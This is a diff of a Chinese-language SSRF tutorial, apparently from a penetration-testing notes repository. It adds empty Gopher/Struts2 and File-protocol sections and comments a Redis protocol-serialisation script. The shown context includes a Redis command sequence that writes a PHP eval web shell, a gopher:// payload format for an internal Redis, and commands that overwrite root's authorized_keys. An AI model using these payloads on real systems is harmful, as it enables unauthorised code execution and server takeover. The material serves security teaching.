@@ -8,6 +8,8 @@
   - [发送请求](#发送请求)
 - [攻击内网Redis](#攻击内网redis)
   - [Redis未授权访问漏洞](#redis未授权访问漏洞)
+- [Gopher协议攻击Struts2框架](#gopher协议攻击struts2框架)
+- [File协议利用](#file协议利用)
 - [参考链接](#参考链接)
 
 ## 漏洞原理
@@ -51,10 +53,12 @@ SSRF(Server-Side Request Forgery，服务端请求伪造攻击)。
 12.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）
 
 **挖掘思路**：
-1、 根SSRF漏洞特征，挖掘方法有二：
+
+1、根据SSRF漏洞特征，挖掘方法有二：
 
 - 数据层面需要关注的关键字段是URL、IP地址、链接等，关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
 - 业务层面需关注任何通过URL进行资源调用（入）或向外发起网络请求（出）的功能，如通过url文件上传下载处是存在SSRF最多的场景。其他具体业务场景包括：内容展示、社交分享、在线翻译、收藏功能、WebMail邮箱、各种处理工具（FFpmg）等
+
 2、探测是否存在漏洞，方法有二：
 
 - 请求包中将参数更改为不同的IP / DNS或TCP端口，观察返回包长度、返回码、返回信息及响应时间，不同则可能存在SSRF漏洞；
@@ -96,7 +100,7 @@ SSRF(Server-Side Request Forgery，服务端请求伪造攻击)。
 
 * 读取文件
   * readfile()
-  * file_get_contents()
+  * file_get_contents()：可获取本地文件和远程文件
   * 传入参数为文件路径，若不加限制，就可读取服务器上任意文件。
 * fsockopen()
   * 打开网络连接，初始化套接字连接到指定主机
@@ -105,6 +109,10 @@ SSRF(Server-Side Request Forgery，服务端请求伪造攻击)。
   * 变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限
 * curl_exec()
   * curl_init()先初始化会话，然后curl_setopt()设置各种参数，curl_exec()执行
+  * 使用条件：
+    * php版本>=5.3
+    * 开启extension=php_curl.dll
+    * --wite-curlwrappers
 
 ## 限制方法及如何绕过
 
@@ -211,9 +219,11 @@ Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用�
 （2）没有设置密码认证或弱密码，导致可以免密登录redis服务
 
 **修复建议：**
- 	1. 禁止外部访问Redis服务端口
-	2. 禁止使用root权限启动redis服务
-	3. 配置安全组，限制可连接redis服务器的IP
+  1. 禁止外部访问Redis服务端口
+   
+  2. 禁止使用root权限启动redis服务
+	
+  3. 配置安全组，限制可连接redis服务器的IP
 
 **危害：**
 
@@ -224,9 +234,9 @@ Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用�
     CRLF="\r\n"
     redis_arr = arr.split(" ")
     cmd=""
-    cmd+="*"+str(len(redis_arr))
+    cmd+="*"+str(len(redis_arr))  # 每一条命令由几个字符串组成
     for x in redis_arr:
-        cmd+=CRLF+"$"+str(len((x)))+CRLF+x
+        cmd+=CRLF+"$"+str(len((x)))+CRLF+x  # 格式为 \r\n$3\r\nget
         # cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
     cmd+=CRLF
     return cmd
@@ -239,6 +249,7 @@ Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用�
    - root启动redis
    - redis弱密码或者无密码
 
+   下面是具体需要执行的命令。
    ```
     flushall
     set 1 '<?php eval($_POST["whoami"]);?>'
@@ -246,7 +257,8 @@ Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用�
     config set dbfilename shell.php
     save
    ```
-
+   
+   但实际中，redis-cli在对redis执行命令时，网络传输的数据时序列化后的协议数据，序列化的数据如下：
    具体的payload格式类似下面：
    ```
     gopher://127.0.0.1:6379/_*1
@@ -302,6 +314,7 @@ Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用�
     config set dir /root/.ssh/
     config set dbfilename authorized_keys
     save
+    (quit)
    ```
 
    密钥验证大致过程如下：
@@ -337,6 +350,13 @@ Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用�
    ```
 
    ```
+
+## Gopher协议攻击Struts2框架
+
+
+## File协议利用
+
+
 
 ## 参考链接
 
